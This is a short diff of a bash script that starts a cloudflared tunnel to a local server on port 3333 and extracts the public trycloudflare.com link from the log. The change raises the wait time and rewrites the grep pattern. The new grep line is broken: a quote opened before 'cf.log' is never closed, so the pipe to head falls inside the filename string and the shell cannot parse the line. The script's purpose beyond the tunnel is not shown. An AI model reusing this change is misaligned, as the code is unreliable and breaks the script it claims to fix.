@@ -99,8 +99,8 @@ sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm cf.log > /dev/null 2>&1 &
 ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
-sleep 10
-link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
+sleep 15
+link=$(grep -oE 'https://[A-Za-z0-9,-]+\.trycloudflare.com' "cf.log | head -n1)
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
 exit 1
